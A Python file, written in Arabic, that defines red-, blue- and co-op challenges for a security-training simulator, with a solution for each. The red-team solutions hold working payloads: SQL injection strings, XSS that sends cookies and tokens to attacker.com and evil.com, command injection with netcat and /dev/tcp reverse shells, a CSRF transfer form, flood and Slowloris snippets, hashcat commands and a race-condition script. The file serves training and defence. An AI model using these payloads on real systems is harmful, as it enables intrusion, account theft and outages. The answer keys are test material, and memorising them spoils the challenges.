"""
إضافة تحديات شاملة للمحاكي
هذا الملف يحتوي على تحديات واقعية للهجوم والدفاع و Co-op
"""

def get_all_challenges():
    """إرجاع جميع التحديات المتاحة"""
    
    challenges = [
        # ==================== RED TEAM - SQL INJECTION ====================
        {
            'title': 'SQL Injection - المستوى الأساسي',
            'description': '''
            هجوم SQL Injection الأساسي:
            
            لديك صفحة تسجيل دخول ضعيفة. حاول تسجيل الدخول كمسؤول دون معرفة كلمة المرور.
            
            استخدم payload يحتوي على:
            - OR 1=1
            - UNION SELECT
            - تعليقات SQL (-- أو #)
            
            مثال: admin' OR '1'='1
            ''',
            'category': 'red',
            'difficulty': 'easy',
            'challenge_type': 'sql_injection',
            'max_score': 50,
            'time_limit': 300,
            'solution': '''
            الحل:
            استخدم: admin' OR '1'='1'--
            أو: ' UNION SELECT * FROM users--
            
            هذا يغير الاستعلام من:
            SELECT * FROM users WHERE username='admin' AND password='xxx'
            
            إلى:
            SELECT * FROM users WHERE username='admin' OR '1'='1'-- AND password='xxx'
            
            مما يجعل الشرط دائماً صحيح.
            '''
        },
        {
            'title': 'SQL Injection - UNION Attack',
            'description': '''
            هجوم UNION SELECT المتقدم:
            
            قاعدة البيانات تحتوي على جداول متعددة. استخدم UNION لاستخراج بيانات من جدول آخر.
            
            يجب أن يحتوي الحل على:
            - UNION SELECT
            - نفس عدد الأعمدة
            - استخراج بيانات حساسة
            
            مثال للبنية: ' UNION SELECT username, password FROM admin_users--
            ''',
            'category': 'red',
            'difficulty': 'medium',
            'challenge_type': 'sql_injection',
            'max_score': 100,
            'time_limit': 600,
            'solution': '''
            الحل:
            ' UNION SELECT id, username, password, email FROM admin_users--
            
            أو:
            1' UNION SELECT NULL, username, password, NULL FROM users WHERE is_admin=1--
            
            يجب مطابقة عدد الأعمدة في الاستعلام الأصلي.
            '''
        },
        {
            'title': 'SQL Injection - Time-Based Blind',
            'description': '''
            Blind SQL Injection باستخدام Time delay:
            
            التطبيق لا يعرض أخطاء SQL، لكن يمكنك استخدام تأخير زمني.
            
            استخدم:
            - SLEEP() في MySQL
            - WAITFOR DELAY في SQL Server
            - pg_sleep() في PostgreSQL
            
            مثال: ' OR SLEEP(5)--
            ''',
            'category': 'red',
            'difficulty': 'hard',
            'challenge_type': 'sql_injection',
            'max_score': 150,
            'time_limit': 900,
            'solution': '''
            الحل:
            ' OR IF(1=1, SLEEP(5), 0)--
            
            أو:
            '; WAITFOR DELAY '00:00:05'--
            
            إذا حدث تأخير، يعني الشرط صحيح.
            '''
        },
        
        # ==================== BLUE TEAM - SQL INJECTION DEFENSE ====================
        {
            'title': 'الدفاع ضد SQL Injection - Prepared Statements',
            'description': '''
            حماية التطبيق من SQL Injection:
            
            اكتب كود يستخدم Prepared Statements بدلاً من دمج المتغيرات مباشرة.
            
            يجب أن يتضمن الحل:
            - استخدام placeholders (? أو :name)
            - bind parameters
            - عدم دمج المتغيرات مباشرة في SQL
            
            مثال: استخدم prepare() و bind_param()
            ''',
            'category': 'blue',
            'difficulty': 'easy',
            'challenge_type': 'sql_injection_defense',
            'max_score': 50,
            'time_limit': 300,
            'solution': '''
            الحل الصحيح:
            
            Python:
            cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
            
            PHP:
            $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
            $stmt->execute(['user' => $username, 'pass' => $password]);
            
            لا تستخدم أبداً:
            query = "SELECT * FROM users WHERE username = '" + username + "'"
            '''
        },
        {
            'title': 'الدفاع المتقدم - Input Validation + ORM',
            'description': '''
            دفاع متعدد الطبقات ضد SQL Injection:
            
            قم بتطبيق:
            1. Input Validation (whitelist)
            2. استخدام ORM
            3. Parameterized queries
            4. Least privilege database permissions
            
            اشرح كيف تطبق كل طبقة.
            ''',
            'category': 'blue',
            'difficulty': 'medium',
            'challenge_type': 'sql_injection_defense',
            'max_score': 100,
            'time_limit': 600,
            'solution': '''
            حل متعدد الطبقات:
            
            1. Input Validation:
               - whitelist للأحرف المسموح بها
               - رفض أي input يحتوي على SQL keywords
            
            2. ORM Usage:
               User.query.filter_by(username=username).first()
               بدلاً من raw SQL
            
            3. Prepared Statements:
               دائماً استخدم parameterized queries
            
            4. Database Permissions:
               - حساب التطبيق له أقل صلاحيات ممكنة
               - لا يستطيع DROP أو ALTER
            '''
        },
        
        # ==================== RED TEAM - XSS ====================
        {
            'title': 'XSS - Reflected Attack',
            'description': '''
            هجوم Reflected XSS:
            
            الصفحة تعرض مدخلات المستخدم مباشرة. أدخل script يعرض alert.
            
            حاول:
            - <script>alert('XSS')</script>
            - <img src=x onerror=alert('XSS')>
            - <svg onload=alert('XSS')>
            ''',
            'category': 'red',
            'difficulty': 'easy',
            'challenge_type': 'xss',
            'max_score': 50,
            'time_limit': 300,
            'solution': '''
            الحل:
            <script>alert('XSS')</script>
            
            أو:
            <img src=x onerror=alert(document.cookie)>
            
            أو:
            <svg onload=alert('XSS')>
            '''
        },
        {
            'title': 'XSS - Event Handler Injection',
            'description': '''
            استخدم Event Handlers للـ XSS:
            
            الموقع يمنع <script> لكن لا يمنع event handlers.
            
            استخدم:
            - onerror
            - onload
            - onclick
            - onmouseover
            
            مثال: <img src=x onerror=alert(1)>
            ''',
            'category': 'red',
            'difficulty': 'medium',
            'challenge_type': 'xss',
            'max_score': 75,
            'time_limit': 400,
            'solution': '''
            الحل:
            <img src=x onerror=alert(document.cookie)>
            
            أو:
            <body onload=alert('XSS')>
            
            أو:
            <div onmouseover=alert('XSS')>hover here</div>
            '''
        },
        {
            'title': 'XSS - DOM-Based Attack',
            'description': '''
            DOM-Based XSS متقدم:
            
            استهدف document.cookie أو localStorage لسرقة البيانات.
            
            يجب أن يحتوي الحل على:
            - JavaScript code
            - document.cookie أو localStorage
            - إرسال البيانات لخادم المهاجم
            
            مثال: <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
            ''',
            'category': 'red',
            'difficulty': 'hard',
            'challenge_type': 'xss',
            'max_score': 150,
            'time_limit': 900,
            'solution': '''
            الحل:
            <script>
            fetch('http://attacker.com/steal?data=' + document.cookie);
            </script>
            
            أو:
            <script>
            new Image().src='http://attacker.com/?c='+document.cookie;
            </script>
            
            أو:
            <img src=x onerror="fetch('http://evil.com?'+localStorage.getItem('token'))">
            '''
        },
        
        # ==================== BLUE TEAM - XSS DEFENSE ====================
        {
            'title': 'الدفاع ضد XSS - HTML Encoding',
            'description': '''
            احم التطبيق من XSS باستخدام Encoding:
            
            اكتب كود يقوم بـ:
            - Encode جميع مدخلات المستخدم
            - تحويل < إلى &lt;
            - تحويل > إلى &gt;
            - استخدام htmlspecialchars أو مكتبة مشابهة
            
            اشرح كيف تطبق HTML encoding.
            ''',
            'category': 'blue',
            'difficulty': 'easy',
            'challenge_type': 'xss_defense',
            'max_score': 50,
            'time_limit': 300,
            'solution': '''
            الحل:
            
            Python:
            from html import escape
            safe_output = escape(user_input)
            
            PHP:
            $safe = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
            
            JavaScript:
            element.textContent = userInput; // لا تستخدم innerHTML
            
            هذا يحول:
            <script>alert('XSS')</script>
            
            إلى:
            &lt;script&gt;alert('XSS')&lt;/script&gt;
            '''
        },
        {
            'title': 'الدفاع المتقدم - CSP + Sanitization',
            'description': '''
            دفاع شامل ضد XSS:
            
            قم بتطبيق:
            1. Content Security Policy (CSP)
            2. Input Sanitization
            3. Output Encoding
            4. HTTPOnly Cookies
            
            اشرح كل طبقة دفاعية.
            ''',
            'category': 'blue',
            'difficulty': 'medium',
            'challenge_type': 'xss_defense',
            'max_score': 100,
            'time_limit': 600,
            'solution': '''
            الحل الشامل:
            
            1. Content-Security-Policy:
               Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
               
            2. Input Sanitization:
               استخدم DOMPurify.sanitize(input) أو مكتبة مشابهة
               
            3. Output Encoding:
               دائماً encode قبل عرض البيانات
               
            4. HTTPOnly Cookies:
               Set-Cookie: session=xxx; HttpOnly; Secure
               
            5. X-XSS-Protection:
               X-XSS-Protection: 1; mode=block
            '''
        },
        
        # ==================== RED TEAM - DoS ====================
        {
            'title': 'DoS - HTTP Flood Attack',
            'description': '''
            هجوم HTTP Flood:
            
            اشرح كيف تنفذ HTTP Flood attack لإسقاط الخادم.
            
            يجب أن يتضمن:
            - عدد كبير من الطلبات
            - استهداف endpoints مكلفة (CPU/Memory intensive)
            - توزيع الهجوم (DDoS)
            
            اشرح الطريقة والأدوات.
            ''',
            'category': 'red',
            'difficulty': 'easy',
            'challenge_type': 'dos',
            'max_score': 50,
            'time_limit': 300,
            'solution': '''
            الحل:
            
            1. HTTP Flood:
               - إرسال آلاف الطلبات في الثانية
               - استهداف صفحات ثقيلة (search, login)
               
            2. الأدوات:
               - LOIC (Low Orbit Ion Cannon)
               - HOIC (High Orbit Ion Cannon)
               - hping3
               
            3. الطريقة:
               for i in range(100000):
                   requests.get('http://target.com/heavy-page')
            
            4. DDoS:
               استخدام botnet من أجهزة متعددة
            '''
        },
        {
            'title': 'DoS - Slowloris Attack',
            'description': '''
            هجوم Slowloris المتقدم:
            
            اشرح Slowloris attack الذي يبقي الاتصالات مفتوحة لفترة طويلة.
            
            يجب ذكر:
            - partial HTTP requests
            - keep-alive connections
            - استنفاد thread pool
            
            اشرح كيف يعمل الهجوم.
            ''',
            'category': 'red',
            'difficulty': 'medium',
            'challenge_type': 'dos',
            'max_score': 100,
            'time_limit': 600,
            'solution': '''
            الحل:
            
            Slowloris Attack:
            
            1. المبدأ:
               - فتح عدة اتصالات HTTP
               - إرسال headers جزئية ببطء
               - عدم إنهاء الطلب أبداً
               - استنفاد connections pool
            
            2. التنفيذ:
               import socket
               for i in range(1000):
                   sock = socket.socket()
                   sock.connect(('target.com', 80))
                   sock.send("GET / HTTP/1.1\r\n")
                   # إرسال header واحد كل 10 ثواني
                   
            3. الهدف:
               استهلاك كل الـ threads/connections المتاحة
            '''
        },
        {
            'title': 'DoS - DNS Amplification',
            'description': '''
            هجوم DNS Amplification:
            
            اشرح كيف تستخدم DNS servers لتضخيم الهجوم.
            
            يجب ذكر:
            - DNS recursive queries
            - IP spoofing
            - amplification factor
            - reflection attack
            ''',
            'category': 'red',
            'difficulty': 'hard',
            'challenge_type': 'dos',
            'max_score': 150,
            'time_limit': 900,
            'solution': '''
            الحل:
            
            DNS Amplification:
            
            1. المبدأ:
               - إرسال DNS query صغير (60 bytes)
               - الرد يكون كبير (3000 bytes)
               - amplification factor = 50x
            
            2. IP Spoofing:
               - تزوير source IP = IP الضحية
               - DNS server يرسل الرد للضحية
            
            3. التنفيذ:
               - استخدام open DNS resolvers
               - ANY query على domain كبير
               - توزيع على عدة DNS servers
            
            4. الأدوات:
               - hping3
               - dnsrecon
            '''
        },
        
        # ==================== BLUE TEAM - DoS DEFENSE ====================
        {
            'title': 'الدفاع ضد DoS - Rate Limiting',
            'description': '''
            تطبيق Rate Limiting:
            
            اكتب كود يحدد عدد الطلبات المسموح بها:
            - X requests per minute من نفس IP
            - استخدام sliding window أو token bucket
            - رد برمز 429 (Too Many Requests)
            
            اشرح التطبيق.
            ''',
            'category': 'blue',
            'difficulty': 'easy',
            'challenge_type': 'dos_defense',
            'max_score': 50,
            'time_limit': 300,
            'solution': '''
            الحل:
            
            Python (Flask-Limiter):
            from flask_limiter import Limiter
            limiter = Limiter(app, key_func=lambda: request.remote_addr)
            
            @app.route("/api")
            @limiter.limit("10 per minute")
            def api():
                return "data"
            
            Nginx:
            limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;
            
            location /api/ {
                limit_req zone=mylimit burst=20 nodelay;
            }
            
            هذا يحد من 10 طلبات في الثانية لكل IP.
            '''
        },
        {
            'title': 'الدفاع الشامل - WAF + CDN + Load Balancer',
            'description': '''
            بنية دفاع شاملة ضد DDoS:
            
            صمم architecture تتضمن:
            1. Web Application Firewall (WAF)
            2. Content Delivery Network (CDN)
            3. Load Balancer
            4. Auto-scaling
            5. Rate limiting
            6. Traffic monitoring
            
            اشرح كل مكون ودوره.
            ''',
            'category': 'blue',
            'difficulty': 'medium',
            'challenge_type': 'dos_defense',
            'max_score': 100,
            'time_limit': 600,
            'solution': '''
            الحل الشامل:
            
            1. CDN (Cloudflare/Akamai):
               - توزيع المحتوى جغرافياً
               - امتصاص الهجمات الكبيرة
               
            2. WAF:
               - فلترة الطلبات الخبيثة
               - حماية من OWASP Top 10
               
            3. Load Balancer:
               - توزيع الحمل على عدة servers
               - health checks
               
            4. Rate Limiting:
               - حد أقصى للطلبات per IP
               - تدريجي (burst + sustained)
               
            5. Auto-scaling:
               - زيادة الموارد تلقائياً
               - Kubernetes HPA
               
            6. Monitoring:
               - Prometheus + Grafana
               - تنبيهات عند anomalies
            '''
        },
        
        # ==================== PASSWORD CHALLENGES ====================
        {
            'title': 'فحص قوة كلمة المرور',
            'description': '''
            أنشئ كلمة مرور قوية:
            
            المتطلبات:
            - 8+ أحرف
            - حروف كبيرة وصغيرة
            - أرقام
            - رموز خاصة
            
            أدخل كلمة مرور قوية.
            ''',
            'category': 'blue',
            'difficulty': 'easy',
            'challenge_type': 'password_check',
            'max_score': 50,
            'time_limit': 300,
            'solution': '''
            أمثلة على كلمات مرور قوية:
            - MyP@ssw0rd2024!
            - S3cur3#Pass_2024
            - C0mpl3x!ty@123
            
            تجنب:
            - password123
            - admin
            - qwerty
            - معلومات شخصية
            '''
        },
        {
            'title': 'كسر كلمات المرور - Dictionary Attack',
            'description': '''
            اشرح Dictionary Attack:
            
            كيف تستخدم wordlist لكسر كلمات المرور؟
            
            اذكر:
            - wordlists شائعة (rockyou.txt)
            - الأدوات (hashcat, john)
            - hash types
            ''',
            'category': 'red',
            'difficulty': 'medium',
            'challenge_type': 'password_cracking',
            'max_score': 75,
            'time_limit': 400,
            'solution': '''
            الحل:
            
            Dictionary Attack:
            
            1. احصل على wordlist:
               - rockyou.txt (14 million passwords)
               - crackstation
               
            2. الأدوات:
               hashcat -m 0 -a 0 hashes.txt wordlist.txt
               john --wordlist=rockyou.txt hashes.txt
               
            3. Hash Types:
               - MD5: -m 0
               - SHA1: -m 100
               - bcrypt: -m 3200
               
            4. التحسينات:
               - rules (append numbers, leetspeak)
               - hybrid attacks
            '''
        },
        {
            'title': 'كسر كلمات المرور - Brute Force',
            'description': '''
            اشرح Brute Force Attack:
            
            كيف تجرب كل التركيبات الممكنة؟
            
            احسب:
            - الوقت اللازم لكسر 8 أحرف
            - تأثير تعقيد كلمة المرور
            - استخدام GPU
            ''',
            'category': 'red',
            'difficulty': 'hard',
            'challenge_type': 'password_cracking',
            'max_score': 150,
            'time_limit': 900,
            'solution': '''
            الحل:
            
            Brute Force:
            
            1. الحساب:
               - أحرف صغيرة فقط (26): 26^8 = 208 billion
               - مع أحرف كبيرة (52): 52^8 = 53 trillion
               - مع أرقام (62): 62^8 = 218 trillion
               - مع رموز (95): 95^8 = 6.6 quadrillion
            
            2. السرعة:
               - CPU: ~10,000 hashes/sec
               - GPU (RTX 3090): ~60 billion MD5/sec
               
            3. الوقت:
               - 8 أحرف lowercase: 6 hours (GPU)
               - 8 أحرف mixed: years
               - 12 أحرف mixed: centuries
            
            4. الأدوات:
               hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a
            '''
        },
        
        # ==================== CSRF CHALLENGES ====================
        {
            'title': 'CSRF - هجوم أساسي',
            'description': '''
            نفذ هجوم CSRF بسيط:
            
            اشرح كيف تجبر المستخدم على تنفيذ action غير مرغوب.
            
            يجب ذكر:
            - استغلال session/cookie
            - form auto-submit
            - GET vs POST requests
            ''',
            'category': 'red',
            'difficulty': 'easy',
            'challenge_type': 'csrf',
            'max_score': 50,
            'time_limit': 300,
            'solution': '''
            الحل:
            
            CSRF Attack:
            
            <form action="http://bank.com/transfer" method="POST">
              <input type="hidden" name="to" value="attacker">
              <input type="hidden" name="amount" value="10000">
            </form>
            <script>
              document.forms[0].submit();
            </script>
            
            عندما يزور المستخدم المصاب هذه الصفحة،
            سيتم إرسال الطلب تلقائياً باستخدام cookies الخاصة به.
            '''
        },
        {
            'title': 'الدفاع ضد CSRF - CSRF Tokens',
            'description': '''
            طبق حماية CSRF:
            
            اكتب كود يستخدم CSRF tokens.
            
            يجب أن يتضمن:
            - توليد token عشوائي
            - تضمينه في النماذج
            - التحقق منه server-side
            - SameSite cookies
            ''',
            'category': 'blue',
            'difficulty': 'medium',
            'challenge_type': 'csrf_defense',
            'max_score': 75,
            'time_limit': 400,
            'solution': '''
            الحل:
            
            Python (Flask):
            from flask_wtf.csrf import CSRFProtect
            csrf = CSRFProtect(app)
            
            في النموذج:
            <form method="POST">
              {{ csrf_token() }}
              <!-- form fields -->
            </form>
            
            SameSite Cookie:
            Set-Cookie: session=xxx; SameSite=Strict; HttpOnly; Secure
            
            التحقق:
            - Flask-WTF يتحقق تلقائياً
            - token يجب أن يطابق session
            - تجديد token بعد كل استخدام
            '''
        },
        
        # ==================== COMMAND INJECTION ====================
        {
            'title': 'Command Injection - هجوم أساسي',
            'description': '''
            نفذ Command Injection:
            
            التطبيق ينفذ أوامر shell. استخدم:
            - command chaining (; && ||)
            - command substitution ($())
            - pipe (|)
            
            مثال: filename.txt; cat /etc/passwd
            ''',
            'category': 'red',
            'difficulty': 'medium',
            'challenge_type': 'command_injection',
            'max_score': 100,
            'time_limit': 600,
            'solution': '''
            الحل:
            
            Command Injection Payloads:
            
            1. Command chaining:
               file.txt; whoami
               file.txt && ls -la
               file.txt || cat /etc/passwd
            
            2. Command substitution:
               file.txt `cat /etc/passwd`
               file.txt $(whoami)
            
            3. Pipe:
               file.txt | nc attacker.com 4444
            
            4. Reverse shell:
               ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
            '''
        },
        {
            'title': 'الدفاع ضد Command Injection',
            'description': '''
            احم التطبيق من Command Injection:
            
            طبق:
            - Input validation (whitelist)
            - escapeshellarg() / escapeshellcmd()
            - تجنب shell execution
            - استخدام libraries بدلاً من shell
            ''',
            'category': 'blue',
            'difficulty': 'medium',
            'challenge_type': 'command_injection_defense',
            'max_score': 100,
            'time_limit': 600,
            'solution': '''
            الحل:
            
            1. Input Validation:
               allowed_chars = re.match(r'^[a-zA-Z0-9._-]+$', filename)
               if not allowed_chars:
                   raise ValueError("Invalid filename")
            
            2. Avoid Shell:
               # خطأ:
               os.system("ls " + filename)
               
               # صحيح:
               subprocess.run(["ls", filename])
            
            3. Escaping:
               import shlex
               safe_arg = shlex.quote(user_input)
            
            4. Use Libraries:
               بدلاً من shell commands، استخدم Python/library functions
               os.listdir() بدلاً من os.system("ls")
            '''
        },
        
        # ==================== CO-OP CHALLENGES ====================
        {
            'title': 'Co-op: دفاع جماعي ضد هجوم متعدد',
            'description': '''
            تحدي تعاوني:
            
            يتعرض النظام لهجمات متعددة في نفس الوقت:
            - SQL Injection
            - XSS
            - DoS
            
            تعاون مع زميلك:
            - أحدكم يحمي من SQL Injection
            - الآخر يحمي من XSS
            - معاً حددوا استراتيجية DoS defense
            
            اكتبوا دفاعات شاملة.
            ''',
            'category': 'coop',
            'difficulty': 'hard',
            'challenge_type': 'defense',
            'max_score': 200,
            'time_limit': 1200,
            'solution': '''
            الحل التعاوني:
            
            Player 1 - SQL Injection Defense:
            - Prepared statements على كل queries
            - Input validation
            - Database least privilege
            
            Player 2 - XSS Defense:
            - CSP headers
            - Output encoding
            - Input sanitization
            
            Together - DoS Defense:
            - Rate limiting (10 req/sec per IP)
            - WAF rules
            - CDN (Cloudflare)
            - Auto-scaling
            - Traffic monitoring
            
            Architecture:
            Internet → CDN → WAF → Load Balancer → App Servers → Database
            
            Monitoring:
            - Prometheus metrics
            - Grafana dashboards
            - PagerDuty alerts
            '''
        },
        {
            'title': 'Co-op: اختراق أمني تعاوني',
            'description': '''
            تحدي Red Team تعاوني:
            
            لديكم هدف: اختراق نظام محمي.
            
            تعاونوا:
            - أحدكم يبحث عن SQL Injection
            - الآخر يبحث عن XSS
            - معاً تستغلون الثغرات للوصول لـ admin panel
            
            اكتبوا خطة الهجوم والـ payloads.
            ''',
            'category': 'coop',
            'difficulty': 'hard',
            'challenge_type': 'attack',
            'max_score': 200,
            'time_limit': 1200,
            'solution': '''
            خطة الهجوم التعاونية:
            
            Phase 1 - Reconnaissance:
            - Player 1: فحص النماذج لـ SQL Injection
            - Player 2: فحص المدخلات لـ XSS
            
            Phase 2 - Exploitation:
            - Player 1 يجد SQL Injection في login:
              admin' OR '1'='1'--
              
            - Player 2 يجد Stored XSS في comments:
              <script>fetch('/api/admin?token='+document.cookie)</script>
            
            Phase 3 - Privilege Escalation:
            - Player 1 يستخرج admin credentials:
              ' UNION SELECT username, password FROM admin_users--
              
            - Player 2 يسرق session token عبر XSS
            
            Phase 4 - Access:
            - استخدام admin credentials + stolen token
            - الوصول لـ admin panel
            - exfiltrate data
            '''
        },
        {
            'title': 'Co-op: Incident Response',
            'description': '''
            محاكاة واقعية لـ Incident Response:
            
            النظام تعرض لاختراق!
            
            تعاونوا:
            - تحليل logs
            - تحديد نوع الهجوم
            - containment
            - remediation
            - recovery
            
            اكتبوا تقرير IR كامل.
            ''',
            'category': 'coop',
            'difficulty': 'hard',
            'challenge_type': 'incident_response',
            'max_score': 250,
            'time_limit': 1500,
            'solution': '''
            تقرير Incident Response:
            
            1. Detection:
               - Unusual database queries في logs
               - Multiple failed login attempts
               - Spike في outbound traffic
            
            2. Analysis:
               - Player 1: تحليل database logs
                 وجد: SQL Injection attempts
                 
               - Player 2: تحليل application logs
                 وجد: XSS payload في comments table
            
            3. Containment:
               - Isolate affected servers
               - Block attacker IPs
               - Disable compromised accounts
               - Take database backup
            
            4. Eradication:
               - Patch SQL Injection vulnerability
               - Sanitize XSS in comments
               - Update WAF rules
               - Change all passwords
            
            5. Recovery:
               - Restore clean data
               - Bring systems back online
               - Monitor closely
            
            6. Lessons Learned:
               - Implement prepared statements
               - Add CSP headers
               - Improve monitoring
               - Security training for developers
            '''
        },
        
        # المزيد من التحديات...
        {
            'title': 'Advanced: Race Condition Attack',
            'description': '''
            استغل Race Condition:
            
            النظام يتحقق من الرصيد قبل الخصم، لكن هناك نافذة زمنية.
            
            اشرح كيف ترسل طلبات متزامنة لاستغلال هذه الثغرة.
            ''',
            'category': 'red',
            'difficulty': 'hard',
            'challenge_type': 'race_condition',
            'max_score': 150,
            'time_limit': 900,
            'solution': '''
            Race Condition Exploitation:
            
            السيناريو:
            1. Check balance: if balance >= amount
            2. Withdraw: balance -= amount
            
            الاستغلال:
            - إرسال 10 طلبات سحب متزامنة
            - كلها تمر من check في نفس اللحظة
            - كلها تنفذ withdraw
            
            Python:
            import threading
            import requests
            
            def withdraw():
                requests.post('http://bank.com/withdraw', 
                             data={'amount': 1000})
            
            threads = [threading.Thread(target=withdraw) for _ in range(10)]
            for t in threads:
                t.start()
            
            الحل: استخدام transaction locks
            '''
        },
    ]
    
    return challenges
